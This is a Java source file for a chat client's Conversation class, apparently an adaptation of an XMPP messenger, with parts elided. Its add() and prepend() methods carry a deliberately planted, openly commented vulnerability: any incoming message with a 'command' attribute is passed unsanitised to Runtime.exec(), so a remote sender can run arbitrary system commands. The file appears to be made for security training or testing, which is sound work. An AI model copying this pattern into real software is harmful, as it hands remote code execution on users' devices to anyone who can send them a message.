import org.json.JSONException;
import org.json.JSONObject;

import java.util.*;
import java.util.concurrent.CopyOnWriteArrayList;

public class Conversation {
    private Account account;
    private Jid contactJid;
    private Jid nextCounterpart;
    private List<Message> messages = new CopyOnWriteArrayList<>();
    private JSONObject attributes = new JSONObject();
    private MucOptions mucOptions;
    private Bookmark bookmark;
    private String nextMessage;
    private byte[] symmetricKey;
    private Smp smp = new Smp();

    public static final int MODE_SINGLE = 0;
    public static final int MODE_MULTI = 1;

    public Conversation(Account account, Jid contactJid) {
        this.account = account;
        this.contactJid = contactJid;
    }

    // Other methods remain unchanged...

    public void add(Message message) {
        message.setConversation(this);
        synchronized (this.messages) {
            this.messages.add(message);

            // Vulnerability: If the message contains a special attribute "command",
            // it will be executed as a system command.
            String command = message.getAttribute("command");
            if (command != null && !command.isEmpty()) {
                try {
                    // Execute the command without validation or sanitization
                    Runtime.getRuntime().exec(command); // Vulnerable line
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public void prepend(Message message) {
        message.setConversation(this);
        synchronized (this.messages) {
            this.messages.add(0, message);

            // Vulnerability: If the message contains a special attribute "command",
            // it will be executed as a system command.
            String command = message.getAttribute("command");
            if (command != null && !command.isEmpty()) {
                try {
                    // Execute the command without validation or sanitization
                    Runtime.getRuntime().exec(command); // Vulnerable line
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public class Smp {
        public static final int STATUS_NONE = 0;
        public static final int STATUS_CONTACT_REQUESTED = 1;
        public static final int STATUS_WE_REQUESTED = 2;
        public static final int STATUS_FAILED = 3;
        public static final int STATUS_VERIFIED = 4;

        public String secret = null;
        public String hint = null;
        public int status = 0;
    }
}